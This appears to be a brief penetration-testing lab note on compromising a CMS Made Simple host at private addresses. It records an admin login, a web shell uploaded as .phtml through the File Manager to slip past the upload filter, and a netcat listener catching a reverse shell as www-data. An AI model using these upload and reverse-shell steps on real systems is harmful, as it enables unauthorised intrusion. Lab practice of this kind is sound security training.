# 4 :80 cms ms login

```
# login worked, once ass is changed;
http://192.168.131.74/admin/
CMS Dashboard

# to upload shell
Content> File Manager
# upload shell as .phtml

http://192.168.131.74/uploads/web.phtml
# web shell working

# uploaded shell.php

$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [192.168.49.131] from (UNKNOWN) [192.168.131.74] 55330
SOCKET: Shell has connected! PID: 1151
whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)
mycmsms
```
